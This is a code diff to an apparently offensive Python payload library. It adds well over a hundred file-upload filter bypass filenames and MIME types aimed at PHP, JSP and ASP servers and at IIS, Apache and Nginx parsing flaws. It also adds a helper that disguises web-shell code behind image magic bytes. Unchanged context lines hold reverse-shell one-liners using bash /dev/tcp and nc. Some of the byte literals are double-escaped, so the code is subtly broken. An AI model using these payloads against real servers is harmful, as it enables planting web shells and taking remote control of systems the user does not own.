@@ -67,13 +67,158 @@ class MegaPayloadLibrary:
         "reverse_shell": ["bash -i >& /dev/tcp/A/P 0>&1", "nc -e /bin/sh A P"]
     }
     
-    # 文件上传绕过 (30+ 技巧)
+    # 文件上传绕过 (150+ 技巧) - v2.5增强版
     FILE_UPLOAD = {
-        "php_ext": [".php", ".php3", ".php5", ".phtml", ".pht"],
-        "double_ext": [".php.jpg", ".php;.jpg", ".php%00.jpg"],
-        "case": [".PhP", ".pHp", ".PHp"],
-        "mime": ["image/jpeg", "image/png", "application/octet-stream"]
+        # PHP扩展名绕过 (30+ 变种)
+        "php_ext": [
+            ".php", ".php3", ".php4", ".php5", ".php7", ".phtml", ".pht", ".phps",
+            ".phar", ".pgif", ".shtml", ".htaccess", ".phtm", ".inc"
+        ],
+        # JSP扩展名绕过
+        "jsp_ext": [
+            ".jsp", ".jspx", ".jsw", ".jsv", ".jspf", ".jtml", ".jhtml"
+        ],
+        # ASP扩展名绕过
+        "asp_ext": [
+            ".asp", ".aspx", ".asa", ".cer", ".cdx", ".ashx", ".asmx", ".ascx", ".asax"
+        ],
+        # 双写绕过 (绕过黑名单删除)
+        "double_write": [
+            ".pphphp", ".phpphp", ".pHpHp", ".phphpp", ".pphp",
+            ".jjspsp", ".asaspxpx", ".phphtmltml"
+        ],
+        # 大小写混淆
+        "case_bypass": [
+            ".PhP", ".pHp", ".PHp", ".PHP", ".pHP", ".PhP7", ".PhTmL",
+            ".JsP", ".JsPx", ".AsP", ".AsPx", ".Cer"
+        ],
+        # 双扩展名绕过
+        "double_ext": [
+            ".php.jpg", ".php.png", ".php.gif", ".php.jpeg", ".php.ico",
+            ".jpg.php", ".png.php", ".gif.php",
+            ".php.jpg.php", ".php3.jpg", ".phtml.png"
+        ],
+        # 空格/点/特殊字符绕过 (Windows)
+        "special_char": [
+            ".php ", ".php.", ".php...", ".php .", " .php", ".php::$DATA",
+            ".php::$DATA.jpg", ".php:$DATA", ".php . . .", ".php\t"
+        ],
+        # 分号绕过 (IIS)
+        "semicolon_bypass": [
+            ".php;.jpg", ".php;.png", ".php;.gif", ".asp;.jpg", ".aspx;.jpg",
+            ".cer;.jpg", ".php;xxx.jpg", ".php;.xxx"
+        ],
+        # %00截断 (PHP < 5.3.4)
+        "null_byte": [
+            ".php%00.jpg", ".php\x00.jpg", ".php%00.png", ".php%00.gif",
+            ".php%00", ".php%00%00.jpg"
+        ],
+        # URL编码绕过
+        "url_encode": [
+            ".php%20", ".php%0a", ".php%0d%0a", ".php%09", ".php%00",
+            "%2ephp", ".p%68p", ".%70hp", "%70%68%70"
+        ],
+        # NTFS流绕过 (Windows)
+        "ntfs_stream": [
+            "shell.php::$DATA", "shell.php::$DATA.jpg", "shell.php:$DATA",
+            "shell.php::$INDEX_ALLOCATION", "shell.php::$BITMAP"
+        ],
+        # Content-Type 欺骗 (50+ MIME类型)
+        "mime_types": [
+            "image/jpeg", "image/png", "image/gif", "image/webp", "image/svg+xml",
+            "image/x-icon", "image/bmp", "image/tiff", "image/x-ms-bmp",
+            "application/octet-stream", "application/x-www-form-urlencoded",
+            "multipart/form-data", "text/plain", "text/html",
+            "image/pjpeg", "image/x-png",  # IE特殊类型
+            "image/jpg; charset=php", "image/png; charset=php",
+            "application/x-php", "image/php"
+        ],
+        # 魔术字节头 (绕过文件头检测)
+        "magic_bytes": {
+            "gif": "GIF89a",
+            "png": "\\x89PNG\\r\\n\\x1a\\n",
+            "jpg": "\\xff\\xd8\\xff\\xe0",
+            "bmp": "BM",
+            "pdf": "%PDF-",
+            "zip": "PK\\x03\\x04"
+        },
+        # 特殊文件名绕过
+        "special_names": [
+            "....php", "..;.php", ".....php", "shell.php%20%20%20%20%20.jpg",
+            "shell.php......", "shell.php./.jpg", "shell.php%E2%80%AE.jpg"
+        ],
+        # Apache解析漏洞
+        "apache_parse": [
+            "shell.php.xxx", "shell.php.abc", "shell.php.123",
+            "shell.php.jpg.php", "shell.php.anything"
+        ],
+        # IIS解析漏洞
+        "iis_parse": [
+            "shell.asp;.jpg", "shell.asp%00.jpg", "shell.cer", "shell.asa",
+            "/shell.jpg/shell.asp", "shell.asp/"
+        ],
+        # Nginx解析漏洞
+        "nginx_parse": [
+            "/shell.jpg/shell.php", "/shell.jpg%00.php", "/shell.jpg/.php",
+            "/shell.jpg/1.php", "shell.jpg%20.php"
+        ]
     }
+
+    @classmethod
+    def get_upload_payloads(cls, target_lang: str = "php", bypass_type: str = "all") -> List[str]:
+        """获取文件上传绕过Payload
+
+        Args:
+            target_lang: 目标语言 (php/jsp/asp)
+            bypass_type: 绕过类型 (ext/case/double/special/mime/all)
+        """
+        payloads = []
+
+        # 扩展名绕过
+        if bypass_type in ["ext", "all"]:
+            if target_lang == "php":
+                payloads.extend(cls.FILE_UPLOAD["php_ext"])
+            elif target_lang == "jsp":
+                payloads.extend(cls.FILE_UPLOAD["jsp_ext"])
+            elif target_lang == "asp":
+                payloads.extend(cls.FILE_UPLOAD["asp_ext"])
+
+        # 大小写绕过
+        if bypass_type in ["case", "all"]:
+            payloads.extend(cls.FILE_UPLOAD["case_bypass"])
+
+        # 双写绕过
+        if bypass_type in ["double", "all"]:
+            payloads.extend(cls.FILE_UPLOAD["double_write"])
+            payloads.extend(cls.FILE_UPLOAD["double_ext"])
+
+        # 特殊字符绕过
+        if bypass_type in ["special", "all"]:
+            payloads.extend(cls.FILE_UPLOAD["special_char"])
+            payloads.extend(cls.FILE_UPLOAD["semicolon_bypass"])
+            payloads.extend(cls.FILE_UPLOAD["null_byte"])
+            payloads.extend(cls.FILE_UPLOAD["url_encode"])
+            payloads.extend(cls.FILE_UPLOAD["ntfs_stream"])
+
+        return list(set(payloads))  # 去重
+
+    @classmethod
+    def generate_upload_shell(cls, shell_code: str, file_type: str = "gif") -> bytes:
+        """生成带魔术字节的shell文件
+
+        Args:
+            shell_code: PHP/JSP shell代码
+            file_type: 文件类型 (gif/png/jpg/bmp/pdf)
+        """
+        magic_map = {
+            "gif": b"GIF89a",
+            "png": b"\\x89PNG\\r\\n\\x1a\\n",
+            "jpg": b"\\xff\\xd8\\xff\\xe0\\x00\\x10JFIF",
+            "bmp": b"BM",
+            "pdf": b"%PDF-1.4"
+        }
+        magic = magic_map.get(file_type, b"GIF89a")
+        return magic + b"\\n" + shell_code.encode('utf-8')
     
     @classmethod
     def get_all_payloads(cls) -> Dict:
